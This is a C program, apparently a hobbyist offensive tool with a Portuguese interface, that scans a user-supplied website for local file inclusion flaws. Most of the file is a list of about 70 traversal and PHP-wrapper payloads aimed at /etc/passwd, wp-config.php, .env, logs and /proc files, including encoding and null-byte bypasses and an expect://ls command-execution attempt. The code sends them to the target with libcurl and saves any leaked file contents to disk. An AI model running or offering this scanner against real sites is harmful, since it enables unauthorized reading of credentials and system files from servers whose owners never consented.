#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <unistd.h>

void limpa(){
    system("clear");
}

void imprime_banner() {
    const char *banner[] = {
        "⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠋⠉⠁⠄⠄⠈⠙⠻⣿⣿⣿⣿",
        "⣿⣿⣿⣿⣿⣿⠟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⢿⣿",
        "⣿⣿⣿⣿⡿⠃⠄⠄⠄⢀⣀⣀⡀⠄⠄⠄⠄⠄⠄⠄⠈⢿",
        "⣿⣿⣿⡟⠄⠄⠄⠄⠐⢻⣿⣿⣿⣷⡄⠄⠄⠄⠄⠄⠄⠈",
        "⣿⣿⣿⠃⠄⠄⠄⢀⠴⠛⠙⣿⣿⡿⣿⣦⠄⠄⠄⠄⠄⠄",
        "⣿⣿⠃⠄⢠⡖⠉⠄⠄⠄⣠⣿⡏⠄⢹⣿⠄⠄⠄⠄⠄⢠",
        "⣿⠃⠄⠄⢸⣧⣤⣤⣤⢾⣿⣿⡇⠄⠈⢻⡆⠄⠄⠄⠄⣾",
        "⠁⠄⠄⠄⠈⠉⠛⢿⡟⠉⠉⣿⣷⣀⠄⠄⣿⡆⠄⠄⢠⣿",
        "⠄⠄⠄⠄⠄⠄⢠⡿⠿⢿⣷⣿⣿⣿⣿⣿⠿⠃⠄⠄⣸⣿",
        "⠄⠄⠄⠄⠄⢀⡞⠄⠄⠄⠈⣿⣿⣿⡟⠁⠄⠄⠄⠄⣿⣿",
        "⠄⠄⠄⠄⠄⢸⠄⠄⠄⠄⢀⣿⣿⡟⠄⠄⠄⠄⠄⢠⣿⣿",
        "⠄⠄⠄⠄⠄⠘⠄⠄⠄⢀⡼⠛⠉⠄⠄⠄⠄⠄⠄⣼⣿⣿",
        "⠄⠄⠄⠄⠄⡇⠄⠄⢀⠎⠄⠄⠄⠄Creatd by Wesley Alexsander",
        "⠄⠄⠄⠄⢰⠃⠄⢀⠎⠄⠄⠄https://github.com/WesleyA0101"
    };

    for (int i = 0; i < sizeof(banner) / sizeof(banner[0]); i++) {
        printf("%s\n", banner[i]); 
    }
}




void animacao_carregando(const char *msg){
    const char animacao[] = "|/-\\";
    int i = 0;

    printf("%s", msg);
    fflush(stdout);
    for(int j = 0; j < 20; j++){
        printf("\r%s %c", msg, animacao[i %4]);
	fflush(stdout);
	usleep(100000);
	i++;
    }
    printf("\r%s Concluído!               \n", msg);
}

size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp){
    size_t realsize = size * nmemb;
    if(realsize + strlen(userp) < 4096){
        strncat(userp, contents, realsize);
    }
    return realsize;
}

void salvar_em_arquivos(const char *dados){
    FILE *arquivo = fopen("resultados_lfi.txt", "a");
    if(arquivo != NULL){
        fprintf(arquivo, "%s\n", dados);
	fclose(arquivo);
	printf("\033[0;32;1mResultados salvos em 'resultados_lfi.txt'. \033[0m\n");
    }else{
        printf("\033[0;31;1mErro ao salvar os resultados...\033[0m\n");
    }

}



void exibir_resultados_formatados(const char *dados, const char *url_teste){
    printf("\033[0;32;1mVulnerabilidade LFI encontrada: %s\n", url_teste);
    printf("-----------------------------------------------------------");
    printf("%s\n", dados);
    printf("----------------------------------------------------------");
    salvar_em_arquivos(dados);
}

int verificar_resposta_valida(const char *response){
    return strstr(response, "root:x:") || strstr(response, "[boot loader]") || strstr(response, "server_name");
}

void testar_lfi(const char *url){
    CURL *curl;
    CURLcode res;
    char response[4096] = {0};
    
    const char *listlfi[] = {
    // Basic Local File Inclusions
    "/?page=../../../../etc/passwd",                            // Unix/Linux passwd file
    "/?file=../../../../etc/passwd",                           // Alternative file inclusion
    "/?view=../../../../etc/passwd",                           // Alternative parameter
    "/?document=../../../../etc/passwd",                       // Alternative parameter name
    "/?include=../../../../etc/passwd",                        // Alternative parameter name
    "/?content=../../../../etc/passwd",                        // Reading sensitive file
    "/?path=../../../../etc/passwd",                           // Common path parameter
    "/index.php?page=../../../../etc/passwd",                  // Classic PHP LFI
    "/?module=../../../../etc/passwd",                         // Module-specific inclusion
    "/?load=../../../../etc/passwd",                           // Alternative for loading files

    // Encoded Traversals
    "/?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd",                 // URL-encoded slashes
    "/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", // Double URL-encoded
    "/?page=..%252F..%252F..%252F..%252Fetc%252Fpasswd",       // Double-encoded slashes

    // Null Byte Injection
    "/?page=../../../../etc/passwd%00",                        // Null byte injection
    "/?file=../../../../etc/passwd%00",                        // Null byte with file param

    // Windows Files
    "/?page=../../../../boot.ini",                             // Windows Boot configuration
    "/?file=../../../../windows/win.ini",                      // Windows INI file
    "/?path=../../../../windows/system32/drivers/etc/hosts",   // Windows hosts file

    // Log Files
    "/?page=../../../../var/log/apache2/access.log",           // Unix log poisoning
    "/?file=../../../../var/log/apache2/error.log",            // Unix error logs
    "/?page=../../../../var/log/nginx/access.log",             // Nginx logs
    "/?file=../../../../var/log/nginx/error.log",              // Nginx error logs

    // PHP Wrappers
    "/?page=php://filter/convert.base64-encode/resource=index", // Base64 encoding
    "/?page=php://input",                                      // Include POST input
    "/?page=php://fd/0",                                       // File descriptor

    // NTFS ADS
    "/?page=../../../../boot.ini::$DATA",                      // ADS access on NTFS

    // System Information
    "/?page=/proc/self/environ",                               // Access environment variables
    "/?file=/proc/self/cmdline",                               // Command line arguments
    "/?path=/proc/version",                                    // Kernel version

    // CMS Configuration Files
    "/?page=../../../../wp-config.php",                        // WordPress config file
    "/?file=../../../../configuration.php",                    // Joomla config file
    "/?path=../../../../config.php",                           // General config file
    "/?include=../../../../app/etc/local.xml",                 // Magento config file
    "/?module=../../../../.env",                               // Laravel environment file

    // Directory Traversals
    "/?page=../index.php",                                     // Single level up
    "/?page=../../index.php",                                  // Two levels up
    "/?page=../../../index.php",                               // Three levels up
    "/?page=../../../../index.php",                            // Four levels up

    // Advanced LFI and Bypasses
    "/?file=....//....//....//etc/passwd",                     // Double slashes
    "/?file=....\\\\....\\\\....\\\\etc\\\\passwd",            // Double backslashes
    "/?file=..%2f..%2f..%2f..%2fetc%2fpasswd",                // Mixed encoding
    "/?file=..%5c..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts", // Windows encoding
    "/?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",         // UTF-8 encoded traversal
    "/?file=..%c0%ae%c0%ae%c0%ae%c0%ae/etc/passwd",           // UTF-8 encoded dots
    "/?file=../../../../etc/passwd%2500",                     // Null byte with encoding
    "/?file=../../../../etc/passwd%00.php",                   // PHP extension spoofing

    // More PHP Wrappers
    "/?file=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd", // Base64 encode bypass
    "/?file=php://filter/convert.base64-encode/resource=index.php", // Encode PHP file
    "/?file=php://input",                                   // Read POST input
    "/?file=php://fd/0",                                    // STDIN as file descriptor
    "/?file=php://temp",                                    // PHP temp file stream
    "/?file=php://memory",                                  // PHP memory stream
    "/?file=expect://ls",                                   // Execute commands (if allowed)
    "/?file=zip://../../../../var/log/access.log%23file",   // Zip wrapper to read files
    "/?file=phar://../../../../test.phar",                  // Phar wrapper

    // Log Poisoning
    "/?file=/var/log/apache2/access.log",                  // Poison Apache logs
    "/?file=/var/log/nginx/access.log",                    // Poison Nginx logs
    "/?file=/var/log/httpd/error.log",                     // Poison HTTPD logs

    // Container and Virtual Environments
    "/?file=/proc/self/mounts",                            // Active mounts in the system
    "/?file=/proc/self/cgroup",                            // Cgroup details (Docker, Kubernetes)
    "/?file=/proc/self/fd/0",                              // Open file descriptor 0
    "/?file=/proc/self/fd/1",                              // Open file descriptor 1
    "/?file=/proc/self/exe",                               // Current executable file

    // CMS-specific Configs
    "/?file=../../../../wp-content/debug.log",              // WordPress debug logs
    "/?file=../../../../wp-config.php~",                    // WordPress backup file
    "/?file=../../../../storage/logs/laravel.log",          // Laravel logs
    "/?file=../../../../configuration.php-dist",            // Joomla sample config
};


    int total_listlfi = sizeof(listlfi) / sizeof(listlfi[0]);
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if(curl){
        for(int i = 0; i < total_listlfi; i++){
	    char full_url[512];
	    snprintf(full_url, sizeof(full_url), "%s%s", url, listlfi[i]);

	    animacao_carregando("Testando LFI");

	    curl_easy_setopt(curl, CURLOPT_URL, full_url);
	    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
	    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
	    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

	    memset(response, 0, sizeof(response));
	    printf("Testando: %s\n", full_url);

	    res = curl_easy_perform(curl);

	    if(res == CURLE_OK && verificar_resposta_valida(response)){
	        exibir_resultados_formatados(response, full_url);
	    
	    }else{
	        printf("\033[0;31;1m[Sem vulnerabilidade válida]: %s\n", full_url);
	    }
	}

	curl_easy_cleanup(curl);
    }else{
       printf("Erro ao inicializar cURL.\n");
    }
    curl_global_cleanup();

}

int main(){
    limpa();
    imprime_banner();

    char url[256];

    printf("\nDigite a URL do alvo (ex: https://www.alvo.com): ");
    scanf("%s", url);

    animacao_carregando("Cerregando...");

    printf("\033[0;33;1mIniciando testes de LFI no alvo: %s\n", url);
    printf("\033[0;36;1mEste processo pode demorar dependendo da resposta do servidor.\n");

    testar_lfi(url);

    printf("\033[0;32;1mTeste concluído. Resultados podem ser encontrados em 'resultados_lfi.txt'.\n");

    return 0;

}
